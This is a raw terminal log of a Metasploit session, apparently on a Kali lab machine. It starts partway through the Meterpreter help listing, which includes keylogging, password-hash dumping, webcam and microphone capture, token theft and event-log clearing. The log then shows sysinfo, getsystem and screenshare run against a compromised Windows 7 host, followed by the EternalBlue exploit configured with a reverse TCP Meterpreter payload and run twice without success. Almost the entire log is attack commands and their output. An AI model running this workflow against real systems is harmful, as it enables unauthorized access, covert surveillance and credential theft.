+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Unhook Commands
+===============
+
+    Command                   Description
+    -------                   -----------
+    unhook_pe                 Unhook the current process
+
+
+Priv: Elevate Commands
+======================
+
+    Command                   Description
+    -------                   -----------
+    getsystem                 Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command                   Description
+    -------                   -----------
+    hashdump                  Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command                   Description
+    -------                   -----------
+    timestomp                 Manipulate file MACE attributes
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias for lpwd)
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to the screen
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    show_mount                List all mount points/logical drives
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    getproxy                  Display the current proxy configuration
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    netstat                   Display the network connections
+    portfwd                   Forward a local port to a remote service
+    resolve                   Resolve a set of host names on the target
+    route                     View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    clearev                   Clear the event log
+    drop_token                Relinquishes any active impersonation token.
+    execute                   Execute a command
+    getenv                    Get one or more environment variable values
+    getpid                    Get the current process identifier
+    getprivs                  Attempt to enable all privileges available to the current process
+    getsid                    Get the SID of the user that the server is running as
+    getuid                    Get the user that the server is running as
+    kill                      Terminate a process
+    localtime                 Displays the target system local date and time
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    reboot                    Reboots the remote computer
+    reg                       Modify and interact with the remote registry
+    rev2self                  Calls RevertToSelf() on the remote machine
+    shell                     Drop into a system command shell
+    shutdown                  Shuts down the remote computer
+    steal_token               Attempts to steal an impersonation token from the target process
+    suspend                   Suspends or resumes a list of processes
+    sysinfo                   Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command                   Description
+    -------                   -----------
+    enumdesktops              List all accessible desktops and window stations
+    getdesktop                Get the current meterpreter desktop
+    idletime                  Returns the number of seconds the remote user has been idle
+    keyboard_send             Send keystrokes
+    keyevent                  Send key events
+    keyscan_dump              Dump the keystroke buffer
+    keyscan_start             Start capturing keystrokes
+    keyscan_stop              Stop capturing keystrokes
+    mouse                     Send mouse events
+    screenshare               Watch the remote user desktop in real time
+    screenshot                Grab a screenshot of the interactive desktop
+    setdesktop                Change the meterpreters current desktop
+    uictl                     Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    record_mic                Record audio from the default microphone for X seconds
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the specified webcam
+    webcam_stream             Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on the target system
+
+For more info on a specific command, use [32m<command> -h[0m or [32mhelp <command>[0m.
+
+[4mmeterpreter[0m > sysinfo
+[0mComputer        : ALAN-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+[4mmeterpreter[0m > getsystem
+[0m[1m[31m[-][0m Already running as SYSTEM
+[4mmeterpreter[0m > ls
+[0m^[[A    help
+
+
+
+
+exit
+
+
+
+^C[1m[31m[-][0m ls: Interrupted
+[4mmeterpreter[0m > screenshare
+[0m[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/kali/Rajasploit/MBiCUIZO.html
+[1m[34m[*][0m Streaming...
+[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --interact <id> --timeout <value>[0m
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > screenshare
+[0m[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/kali/Rajasploit/kYLFyErM.html
+[1m[34m[*][0m Streaming...
+[Parent 14413, Main Thread] WARNING: unable to open file '/etc/dconf/db/local': Failed to open file “/etc/dconf/db/local”: open() failed: No such file or directory; expect degraded performance: 'glib warning', file toolkit/xre/nsSigHandlers.cpp:187
+
+(firefox-esr:14413): dconf-[1;33mWARNING[0m **: [34m10:35:05.322[0m: unable to open file '/etc/dconf/db/local': Failed to open file “/etc/dconf/db/local”: open() failed: No such file or directory; expect degraded performance
+[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --interact <id> --timeout <value>[0m
+[4mmeterpreter[0m > screenshare
+[0m[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/kali/Rajasploit/CGyakkAp.html
+[1m[34m[*][0m Streaming...
+[Parent 15108, Main Thread] WARNING: unable to open file '/etc/dconf/db/local': Failed to open file “/etc/dconf/db/local”: open() failed: No such file or directory; expect degraded performance: 'glib warning', file toolkit/xre/nsSigHandlers.cpp:187
+
+(firefox-esr:15108): dconf-[1;33mWARNING[0m **: [34m10:35:27.595[0m: unable to open file '/etc/dconf/db/local': Failed to open file “/etc/dconf/db/local”: open() failed: No such file or directory; expect degraded performance
+[GFX1-]: RenderCompositorSWGL failed mapping default framebuffer, no dt
+^C[1m[31m[-][0m screenshare: Interrupted
+[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.239.252.8 - Meterpreter session 1 closed.  Reason: Died
+run
+[0mUsage: run <script> [arguments]
+
+Executes a ruby script or Metasploit Post module in the context of the
+meterpreter session.  Post modules can take arguments in var=val format.
+Example: run post/foo/bar BAZ=abcd
+
+[4mmeterpreter[0m > screenshare
+[0m[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/kali/Rajasploit/BzbExnrb.html
+[1m[34m[*][0m Streaming...
+[Parent 15796, Main Thread] WARNING: unable to open file '/etc/dconf/db/local': Failed to open file “/etc/dconf/db/local”: open() failed: No such file or directory; expect degraded performance: 'glib warning', file toolkit/xre/nsSigHandlers.cpp:187
+
+(firefox-esr:15796): dconf-[1;33mWARNING[0m **: [34m10:35:55.713[0m: unable to open file '/etc/dconf/db/local': Failed to open file “/etc/dconf/db/local”: open() failed: No such file or directory; expect degraded performance
+^C[1m[31m[-][0m screenshare: Interrupted
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down session: 1
+^C[1m[31m[-][0m exit: Interrupted
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down session: 1
+clear
+^Z
+Background session 1? [y/N]  y
+exit
+^Z
+Background session 1? [y/N]  y
+^C[1m[31m[-][0m exit: Interrupted
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> clear
+[0m[1m[34m[*][0m exec: clear
+
+[H[2J[3J[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.239.252.8     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
+                                             loit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
+                                             t machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
+                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
+                                             chines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
+                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.239.252.221   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 10.239.252.221:4444 
+[1m[34m[*][0m 10.239.252.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[31m[-][0m 10.239.252.8:445      - Rex::HostUnreachable: The host (10.239.252.8:445) was unreachable.
+[1m[34m[*][0m 10.239.252.8:445      - Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m 10.239.252.8:445 - The target is not vulnerable.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 10.239.252.221:4444 
+[1m[34m[*][0m 10.239.252.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[31m[-][0m 10.239.252.8:445      - Rex::HostUnreachable: The host (10.239.252.8:445) was unreachable.
+[1m[34m[*][0m 10.239.252.8:445      - Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m 10.239.252.8:445 - The target is not vulnerable.
+^C[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> exit
+[0m
+Script done on 2025-10-05 10:38:13-04:00 [COMMAND_EXIT_CODE="0"]
